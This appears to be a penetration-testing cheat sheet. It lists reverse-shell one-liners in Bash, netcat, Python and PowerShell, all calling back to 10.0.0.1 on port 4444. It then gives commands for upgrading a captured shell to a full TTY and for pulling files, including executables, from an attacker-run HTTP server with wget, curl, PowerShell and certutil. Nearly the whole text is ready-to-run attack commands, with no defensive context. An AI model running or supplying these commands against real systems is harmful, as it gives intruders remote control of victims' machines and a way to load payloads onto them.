🐚 Reverse Shells

Bash TCP
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
Netcat (Traditional)
nc -e /bin/sh 10.0.0.1 4444
Netcat (OpenBSD / No -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PowerShell
$client = New-Object System.Net.Sockets.TcpClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

🖥️ TTY Spawning (Shell Stabilization)

Use these commands to upgrade a dumb shell to a fully interactive TTY.

Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
Script
/usr/bin/script -qc /bin/bash /dev/null
Full Stabilization (Bash)
# 1. Background the shell Ctrl + Z # 2. Reset local terminal stty raw -echo; fg # 3. Reset remote terminal (inside shell) export TERM=xterm

📂 File Transfers

Python HTTP Server (Sender)
python3 -m http.server 8000
Wget (Linux Receiver)
wget http://10.0.0.1:8000/file.txt -O /tmp/file.txt
Curl (Linux Receiver)
curl http://10.0.0.1:8000/file.txt -o /tmp/file.txt
PowerShell (Windows Receiver)
Invoke-WebRequest -Uri "http://10.0.0.1:8000/file.exe" -OutFile "C:\Temp\file.exe"
Certutil (Windows Receiver)
certutil -urlcache -split -f "http://10.0.0.1:8000/file.exe" file.exe
